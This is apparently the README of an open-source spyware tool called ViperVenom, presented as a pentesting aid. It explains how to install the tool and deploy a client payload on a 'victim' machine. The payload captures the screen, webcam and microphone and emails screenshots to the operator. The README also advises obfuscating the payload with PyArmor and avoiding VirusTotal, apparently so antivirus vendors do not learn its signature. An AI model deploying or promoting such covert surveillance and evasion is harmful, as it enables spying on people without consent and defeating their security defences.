<img src="https://revise7.com/wp-content/uploads/2021/08/Logo2.svg" width="400">

# ViperVenom Spyware Tool for Pentesters

ViperVenom is an open-source cyber offensive tool developed by [Revise7 Security](https://revise7.com)
for pentesters, the tool has the ability to webcam record, screenshot, screenshare and
screen video record in high-quality.
ViperVenom is a great tool when it comes to pentesting assessments, as some sort of a proof
that you broke it to a computer and was able to install ViperVenom to capture the screen

Help us improve the tool by [contacting us](https://revise7.com/contacts/), or by sending an [issue](https://github.com/Revise7/ViperVenom/issues)
Keep in mind, the tool is currently in beta, bugs may happen.

## Important!
Please do not test ViperVenom on VirusTotal, instead, test it on a website like [AntiScan.me](https://antiscan.me/)

## Install Tool
To create the latest tool for your platform from this source repository:

##### Download and extract the source:
[Download Directly from GitHub](https://github.com/Revise7/ViperVenom/archive/refs/heads/main.zip)
```
$ unzip ViperVenom-main.zip
$ cd ViperVenom-main
```
**NOTE:** Instead of downloading the compressed source, you may instead want to clone the GitHub 
repository:
```
$ https://github.com/Revise7/ViperVenom.git
$ cd ViperVenom
$ pip3 install -r requirements.txt
$ python3 vipervenom.py
```

##### ViperVenom's Client Requirements: 
```
$ gedit <payload_name>.py
$ pip3 install -r client_requirements.txt
```
To connect a computer to the listener(you, most likely) you need to install a few Python extensions, for now. The client must have the latest Python
installation, and the Python extensions used in the client file, but you can use a Python compiler to create
an executable.

##### To connect your target computer:
```
$ Python3 <payload_name>.py
```
## Recommeneded !
As we are developing Revise7's ViperVenom, Revise7 tested [pyarmor](https://pypi.org/project/pyarmor/),
PyArmor is a command line tool used to obfuscate python scripts, so you can encode your client file so the source won't be shown.
```
$ pip3 install pyarmor
$ cd vipervenom-main
$ pyarmor obfuscate payload_name.py
```
Thanks for PyArmor developers for the ability to encode Python code without breaking the program, kudos for them!

##### Install Python Extensions for The Client File:
* pillow
* sounddevice
* scipy

## Special Commands
```
screenshot
```
Screenshots victim's computer and sends it directly to your Gmail account as base64 encoded image, decrypt it using the decode_image.py
that comes with ViperVenom and paste the base64 string in base64.txt and run the Python file, base64 and decode_image.py are in "Tools" folder.
```
$ python3 decode_image.py
```
The screenshot should appear in ViperVenom's folder in a .jpg file.
```
mic record
```
Records victim's microphone input( if the victim has an available microphone) for an amount of time you set.
Known bug: You won't be able to type more commands after executing this command, we're working on a fix.

# Contact Us
For more detailed information on developing ViperVenom, please contact us at [our website](https://revise7.com/contacts). 
Revise7 does not take any responsibility in misuse, or for illegal purposes, we cannot control the tool if it goes to the wrong hand as we do not have a kill switch.

[Revise7]: https://revise7.com
[Download file]: https://github.com/Revise7/ViperVenom/archive/refs/heads/main.zip
